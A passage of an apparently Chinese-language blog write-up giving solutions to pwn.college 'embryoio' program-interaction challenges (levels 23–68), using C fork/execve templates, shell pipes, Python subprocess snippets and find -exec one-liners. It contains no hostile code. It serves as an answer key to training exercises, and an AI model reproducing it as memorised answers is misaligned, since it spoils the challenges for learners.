</span></span></code></pre></div><h3 id=23-28 class="relative group">23-28 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#23-28 aria-label=锚点>#</a></span></h3><p>类似 16-21，但使用了 22 的方法。</p><h3 id=29 class="relative group">29 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#29 aria-label=锚点>#</a></span></h3><p>29-35 模版，核心代码位于 <code>/* TODO */</code> 处：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/wait.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>pwncollege</span><span class=p>()</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>binary</span><span class=p>[</span><span class=mi>30</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;/challenge/&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>strcat</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>getenv</span><span class=p>(</span><span class=s>&#34;HOSTNAME&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* TODO */</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>核心代码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>int</span> <span class=n>pid</span> <span class=o>=</span> <span class=n>fork</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>pid</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>execve</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>wait</span><span class=p>(</span><span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><code>fork()</code> 出子进程执行二进制文件，使得其父进程为我们自己的程序。</p><h3 id=30 class="relative group">30 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#30 aria-label=锚点>#</a></span></h3><p>同上。</p><h3 id=31 class="relative group">31 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#31 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=n>binary</span><span class=p>,</span> <span class=s>&#34;pxcsyjgoss&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>pid</span> <span class=o>=</span> <span class=n>fork</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>pid</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>execve</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>wait</span><span class=p>(</span><span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 id=32 class="relative group">32 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#32 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=n>binary</span><span class=p>,</span> <span class=s>&#34;pxcsyjgoss&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=o>*</span><span class=n>env</span><span class=p>[]</span> <span class=o>=</span> <span class=p>{</span><span class=s>&#34;kzdezt=fgdnllplui&#34;</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>pid</span> <span class=o>=</span> <span class=n>fork</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>pid</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>execve</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=n>env</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>wait</span><span class=p>(</span><span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 id=33 class="relative group">33 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#33 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/tmp/igzuqf&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>pid</span> <span class=o>=</span> <span class=n>fork</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>pid</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>dup2</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>STDIN_FILENO</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>execve</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>wait</span><span class=p>(</span><span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 id=34 class="relative group">34 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#34 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>int</span> <span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/tmp/bkvmkz&#34;</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>pid</span> <span class=o>=</span> <span class=n>fork</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>pid</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>dup2</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>STDOUT_FILENO</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>execve</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>close</span><span class=p>(</span><span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>wait</span><span class=p>(</span><span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 id=35 class="relative group">35 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#35 aria-label=锚点>#</a></span></h3><p>同 29。</p><h3 id=36 class="relative group">36 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#36 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ /challenge/<span class=nv>$HOSTNAME</span> <span class=p>|</span> cat
</span></span></code></pre></div><h3 id=37 class="relative group">37 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#37 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ /challenge/<span class=nv>$HOSTNAME</span> <span class=p>|</span> grep pwn
</span></span></code></pre></div><h3 id=38 class="relative group">38 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#38 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ /challenge/<span class=nv>$HOSTNAME</span> <span class=p>|</span> sed /pwn/p
</span></span></code></pre></div><h3 id=39 class="relative group">39 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#39 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ /challenge/<span class=nv>$HOSTNAME</span> <span class=p>|</span> rev <span class=p>|</span> rev
</span></span></code></pre></div><h3 id=40 class="relative group">40 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#40 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ cat <span class=p>|</span> /challenge/<span class=nv>$HOSTNAME</span>
</span></span></code></pre></div><h3 id=41 class="relative group">41 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#41 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ rev <span class=p>|</span> /challenge/<span class=nv>$HOSTNAME</span>
</span></span></code></pre></div><p>倒序输入密码，<code>Ctrl+D</code>。</p><h3 id=42-47 class="relative group">42-47 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#42-47 aria-label=锚点>#</a></span></h3><p>类似 36-41，但用 shell 脚本执行。</p><h3 id=48 class="relative group">48 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#48 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>p1</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p2</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=s2>&#34;cat&#34;</span><span class=p>,</span> <span class=n>stdin</span><span class=o>=</span><span class=n>p1</span><span class=o>.</span><span class=n>stdout</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p2</span><span class=o>.</span><span class=n>communicate</span><span class=p>()</span>
</span></span></code></pre></div><p>48-53 都需要：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ ipython
</span></span><span class=line><span class=cl>&gt; %run interact.py
</span></span></code></pre></div><h3 id=49 class="relative group">49 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#49 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>p1</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p2</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>([</span><span class=s2>&#34;grep&#34;</span><span class=p>,</span><span class=s2>&#34;pwn&#34;</span><span class=p>],</span> <span class=n>stdin</span><span class=o>=</span><span class=n>p1</span><span class=o>.</span><span class=n>stdout</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p2</span><span class=o>.</span><span class=n>communicate</span><span class=p>()</span>
</span></span></code></pre></div><h3 id=50 class="relative group">50 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#50 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>p1</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p2</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>([</span><span class=s2>&#34;sed&#34;</span><span class=p>,</span><span class=s2>&#34;/pwn/p&#34;</span><span class=p>],</span> <span class=n>stdin</span><span class=o>=</span><span class=n>p1</span><span class=o>.</span><span class=n>stdout</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p2</span><span class=o>.</span><span class=n>communicate</span><span class=p>()</span>
</span></span></code></pre></div><h3 id=51 class="relative group">51 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#51 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>p1</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p2</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=s2>&#34;rev&#34;</span><span class=p>,</span> <span class=n>stdin</span><span class=o>=</span><span class=n>p1</span><span class=o>.</span><span class=n>stdout</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p3</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=s2>&#34;rev&#34;</span><span class=p>,</span> <span class=n>stdin</span><span class=o>=</span><span class=n>p2</span><span class=o>.</span><span class=n>stdout</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p3</span><span class=o>.</span><span class=n>communicate</span><span class=p>()</span>
</span></span></code></pre></div><h3 id=52 class="relative group">52 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#52 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>p1</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=s2>&#34;cat&#34;</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p2</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>stdin</span><span class=o>=</span><span class=n>p1</span><span class=o>.</span><span class=n>stdout</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p2</span><span class=o>.</span><span class=n>communicate</span><span class=p>()</span>
</span></span></code></pre></div><h3 id=53 class="relative group">53 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#53 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>binary</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/challenge/</span><span class=si>{</span><span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;HOSTNAME&#34;</span><span class=p>)</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>p1</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=s2>&#34;rev&#34;</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p2</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>stdin</span><span class=o>=</span><span class=n>p1</span><span class=o>.</span><span class=n>stdout</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p2</span><span class=o>.</span><span class=n>communicate</span><span class=p>()</span>
</span></span></code></pre></div><p>倒序输入密码，<code>Ctrl+D</code>。</p><h3 id=54-59 class="relative group">54-59 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#54-59 aria-label=锚点>#</a></span></h3><p>类似 48-53，但使用 python 执行而不是 ipython。</p><h3 id=60-65 class="relative group">60-65 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#60-65 aria-label=锚点>#</a></span></h3><p>类似 36-41，但使用 29 的方法编译出 <code>a.out</code> 并执行。</p><h3 id=66 class="relative group">66 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#66 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ find /challenge/ -name embryoio* -exec <span class=o>{}</span> <span class=se>\;</span>
</span></span></code></pre></div><h3 id=67 class="relative group">67 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#67 aria-label=锚点>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ find /challenge/ -name embryoio* -exec <span class=o>{}</span> uwazdyddun <span class=se>\;</span>
</span></span></code></pre></div><h3 id=68 class="relative group">68 <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#68 aria-label=锚点>#</a></span></h3><p>68-73 模版：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/wait.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>pwncollege</span><span class=p>()</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>binary</span><span class=p>[</span><span class=mi>30</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;/challenge/&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>strcat</span><span class=p>(</span><span class=n>binary</span><span class=p>,</span> <span class=n>getenv</span><span class=p>(</span><span class=s>&#34;HOSTNAME&#34;</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/* TODO */</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>核心代码：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=kt>int</span> <span class=n>i</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[</span><span class=mi>200</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>binary</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>142</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>argv</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;dummy&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>argv</span><span class=p>[</span><span class=mi>142</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;nillucsndu&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>argv</span><span class=p>[</span><span class=mi>143</span><span class=p>]</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
